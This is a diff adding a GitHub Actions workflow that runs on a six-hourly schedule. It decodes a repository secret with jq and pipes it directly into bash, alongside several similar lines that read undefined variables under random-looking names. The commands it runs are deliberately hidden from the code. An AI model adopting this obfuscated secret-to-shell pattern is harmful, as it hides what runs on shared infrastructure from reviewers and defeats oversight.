@@ -1,0 +1,24 @@
+name: qudailiyu
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '20 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: qudailiyu
+        env:
+          ygg0626: ${{ secrets.ygg0626 }}
+        run: |
+          echo $ygg0626 | jq -r .orre5579 | /bin/bash
+          echo $mvus4 | jq -r .tujfx866 | /bin/bash
+          echo $kk41596 | jq -r .qkpo53547 | /bin/bash
+          echo $j150 | jq -r .vbjb70670 | /bin/bash
+          echo $lyov7261 | jq -r .djzu07 | /bin/bash
+          echo $blqth9486 | jq -r .qf0 | /bin/bash
+
